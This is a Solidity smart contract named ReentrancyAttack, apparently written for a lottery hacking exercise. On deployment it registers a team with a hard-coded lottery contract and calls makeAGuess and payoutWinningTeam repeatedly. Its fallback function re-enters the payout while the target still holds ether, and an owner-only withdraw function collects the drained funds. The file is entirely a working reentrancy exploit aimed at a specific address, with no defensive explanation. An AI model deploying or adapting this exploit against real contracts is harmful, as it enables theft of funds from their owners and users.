// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ILottery {
    function payoutWinningTeam(address _team) external returns (bool);
    function makeAGuess(address _team, uint256 _guess) external returns (bool);
    function registerTeam(address _walletAddress, string calldata _teamName, string calldata _password) external payable;
}

contract ReentrancyAttack is Ownable {
    event Log(string);

    address lotteryAddress = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;

    constructor() payable {
        ILottery(lotteryAddress).registerTeam{value: msg.value}(address(this), 'teamhack1', "password");
        attack();
    }

    fallback() external {
        emit Log("Fallback called");
        if (address(ILottery(lotteryAddress)).balance >= 0.000000002 ether) {
            ILottery(lotteryAddress).makeAGuess(address(this), 0);
            ILottery(lotteryAddress).payoutWinningTeam(address(this));
        }
    }

    function attack() public {
        ILottery(lotteryAddress).makeAGuess(address(this), 0);
        ILottery(lotteryAddress).makeAGuess(address(this), 0);
        ILottery(lotteryAddress).makeAGuess(address(this), 0);
        ILottery(lotteryAddress).makeAGuess(address(this), 0);
        ILottery(lotteryAddress).makeAGuess(address(this), 0);
        ILottery(lotteryAddress).makeAGuess(address(this), 0);
        ILottery(lotteryAddress).payoutWinningTeam(address(this));
    }

    function withdraw(address payable receiver) public onlyOwner {
        receiver.transfer(address(this).balance);
    }
}
